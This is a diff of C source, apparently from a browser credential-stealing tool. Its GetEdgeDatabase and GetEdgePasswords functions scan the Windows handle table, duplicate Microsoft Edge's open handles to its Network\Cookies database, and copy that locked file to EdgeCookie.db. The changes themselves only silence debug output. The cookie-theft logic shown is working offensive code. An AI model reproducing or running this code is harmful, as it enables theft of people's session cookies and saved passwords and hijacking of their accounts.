@@ -682,8 +682,6 @@ VOID GetEdgePID() {
 }
 
 BOOL GetEdgeDatabase(DWORD PID) {
-    
-      
     printf("Edge PID found %d\n", PID);
     
     SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
@@ -717,7 +715,6 @@ BOOL GetEdgeDatabase(DWORD PID) {
 
     POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
     
-    
     for(i = 0; i < shi->NumberOfHandles; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
         if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
@@ -729,8 +726,8 @@ BOOL GetEdgeDatabase(DWORD PID) {
             NTSTATUS ret = 0;
             HANDLE dupHandle = NULL;
 
-            printf("Granted Access: %08x\n", handle.GrantedAccess);
-            printf("Handle Attributes: %08x\n", handle.HandleAttributes);
+            //printf("Granted Access: %08x\n", handle.GrantedAccess);
+            //printf("Handle Attributes: %08x\n", handle.HandleAttributes);
 
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                 //printf("Opening process\n");
@@ -764,7 +761,7 @@ BOOL GetEdgeDatabase(DWORD PID) {
                 }
                 
                 if (ret == 0 && objectNameInfo->Name.Length > 0){
-                    printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    //printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
                     char handleName[1024];
                     sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
@@ -780,11 +777,6 @@ BOOL GetEdgeDatabase(DWORD PID) {
                     if (ret == 0 && strcmp(objectTypeInfo,"File")){
                         char* found = strstr(handleName, "Network\\Cookies");
                         if (found != NULL) {
-                            printf("printing char\n");
-                                printf("13th Char: %c", found[13]);
-                                printf("14th Char: %c", found[14]);
-                                printf("15th Char: %c", found[15]);
-                                printf("-1th Char: %c", found[-1]);
                                 printf("COOKIE WAS FOUND\n");
                                 printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
                                 SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
@@ -797,11 +789,9 @@ BOOL GetEdgeDatabase(DWORD PID) {
                                 HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                                 WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                                 CloseHandle(hFile);
-
                                 GlobalFree(buffer);
                                 continue;
                             }
-                            
                     }
                     else{
                         CloseHandle(dupHandle);
@@ -864,8 +854,8 @@ BOOL GetEdgePasswords(DWORD PID) {
             NTSTATUS ret = 0;
             HANDLE dupHandle = NULL;
 
-            printf("Granted Access: %08x\n", handle.GrantedAccess);
-            printf("Handle Attributes: %08x\n", handle.HandleAttributes);
+            //printf("Granted Access: %08x\n", handle.GrantedAccess);
+            //printf("Handle Attributes: %08x\n", handle.HandleAttributes);
 
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                 //printf("Opening process\n");
